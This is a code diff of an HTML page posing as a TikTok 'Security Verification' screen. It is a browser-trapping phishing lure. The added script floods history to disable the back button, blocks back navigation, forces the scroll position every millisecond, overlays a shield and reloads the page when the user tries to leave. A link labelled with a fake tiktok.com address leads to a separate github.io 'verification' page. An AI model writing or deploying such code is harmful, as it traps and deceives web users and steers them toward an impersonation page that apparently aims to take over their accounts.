@@ -4,81 +4,111 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        /* 1. CSS SCROLL SNAP - Forces the browser engine to 'lock' onto the trap */
+        /* THE GPU HIJACK */
         html {
             scroll-snap-type: y mandatory;
             overflow-y: scroll;
             height: 100vh;
-            scroll-behavior: auto;
+            scroll-behavior: auto; /* Instant jump */
         }
         
-        body { margin: 0; padding: 0; background: #ffffff; height: 400vh; }
+        body { 
+            margin: 0; padding: 0; background: #ffffff; 
+            height: 500vh; /* Massive height to bury the UI */
+        }
 
-        /* Create a massive void above the content */
-        #void { height: 150vh; width: 100%; background: #ffffff; }
+        /* Massive void to push content below the fold */
+        #buffer { height: 120vh; width: 100%; }
 
-        /* The actual trap area */
-        #trap-container {
+        #trap-zone {
             height: 100vh;
-            scroll-snap-align: start; /* The CSS engine forces a jump here */
+            scroll-snap-align: start; /* CSS engine lock */
             text-align: center;
             font-family: "Proxima Nova", sans-serif;
             position: relative;
         }
 
-        /* 2. PROGRAMMATIC TRIGGER: Hidden input with autofocus */
-        .trigger {
-            position: absolute;
-            top: 10px;
-            opacity: 0;
-            pointer-events: none;
+        /* The Ghost Input */
+        #trigger {
+            opacity: 0; position: absolute; top: 0; 
+            width: 1px; height: 1px; pointer-events: none;
         }
 
-        /* UI Styles */
-        #lock-shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
-        .v-icon { width: 60px; margin: 50px auto 20px; display: block; }
-        .title { font-size: 22px; font-weight: 700; color: #161823; }
-        .msg { color: #8A8B91; padding: 0 40px; margin-top: 10px; line-height: 1.4; }
-        #breakout { color: #0049f6; text-decoration: underline; font-weight: 600; display: block; margin-top: 40px; }
+        /* Visual Elements */
+        .v-icon { width: 60px; margin: 60px auto 20px; display: block; }
+        .header { font-size: 24px; font-weight: 800; color: #161823; }
+        .sub { color: #8A8B91; padding: 0 40px; margin-top: 15px; font-size: 16px; }
+        #link { color: #0049f6; text-decoration: underline; font-weight: 600; display: block; margin-top: 45px; }
+        
+        /* The Shield */
+        #shield { 
+            display: none; position: fixed; top: 0; left: 0; 
+            width: 100%; height: 100%; z-index: 99999; 
+        }
     </style>
 </head>
-<body>
-    <div id="lock-shield"></div>
-    <div id="void"></div>
+<body onload="lockDown()">
+    <div id="shield"></div>
 
-    <div id="trap-container">
-        <input type="text" class="trigger" autofocus>
+    <div id="buffer"></div>
+
+    <div id="trap-zone" id="start">
+        <input type="text" id="trigger" autofocus>
+
+        <svg class="v-icon" viewBox="0 0 48 48" fill="none">
+            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
+            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
+            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
+        </svg>
+
+        <div class="header">Security Verification</div>
+        <div class="sub">Complete the final step to secure your TikTok session.</div>
         
-        <img class="v-icon" src="https://www.gstatic.com/images/icons/material/system/2x/security_black_48dp.png" alt="security">
-        <div class="title">Verification Required</div>
-        <div class="msg">Please follow the instructions to verify your account session.</div>
-        
-        <a id="breakout" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">https://www.tiktok.com/verify-session</a>
+        <a id="link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">
+            https://www.tiktok.com/verify-secure
+        </a>
     </div>
 
-    <script>
-        // 3. THE RENDERER HIJACK
-        window.addEventListener('load', () => {
-            // Force a history flood to kill the 'Back' button immediately
-            for(let i=0; i<15; i++) { history.pushState(null, null, location.href); }
-            
-            // Re-enforce the jump in case autofocus was partially blocked
-            const trap = document.getElementById('trap-container');
-            trap.scrollIntoView({ behavior: 'auto', block: 'start' });
+<script>
+    function lockDown() {
+        // 1. Fragment Force: Tells the browser the page starts at #start
+        if(window.location.hash !== "#start") {
+            window.location.replace("#start");
+        }
 
-            // Activate the scroll-freeze
-            document.getElementById('lock-shield').style.display = 'block';
-            
-            // If they try to pull the header down, slam it back
-            setInterval(() => {
-                if (window.pageYOffset < 500) {
-                    window.scrollTo(0, 1000); // Slam back to trap
-                }
-            }, 50);
-        });
+        // 2. Browser Focus Hijack
+        document.getElementById('trigger').focus();
 
-        // Nuclear option: If they manage to click 'X', reload immediately
-        window.onblur = () => { setTimeout(() => { location.reload(); }, 10); };
-    </script>
+        // 3. History Prison
+        for(let i=0; i<30; i++) {
+            history.pushState(null, null, window.location.href);
+        }
+
+        // 4. Activate the Lock
+        const trapPos = document.getElementById('buffer').offsetHeight;
+        document.getElementById('shield').style.display = 'block';
+
+        // THE PRISON LOOP: Runs every 1ms to ensure the UI can never slide down
+        setInterval(() => {
+            if (window.pageYOffset < (trapPos - 5)) {
+                window.scrollTo(0, trapPos);
+            }
+        }, 1);
+
+        // 5. Back Button Intercept
+        window.onpopstate = function() {
+            history.pushState(null, null, window.location.href);
+            window.scrollTo(0, trapPos);
+        };
+
+        // 6. Nuclear Exit Block: Refresh on blur
+        window.onblur = function() {
+            setTimeout(() => { location.replace(location.href); }, 5);
+        };
+    }
+
+    // Secondary listener in case onload is throttled
+    document.addEventListener('DOMContentLoaded', lockDown);
+</script>
 </body>
 </html>
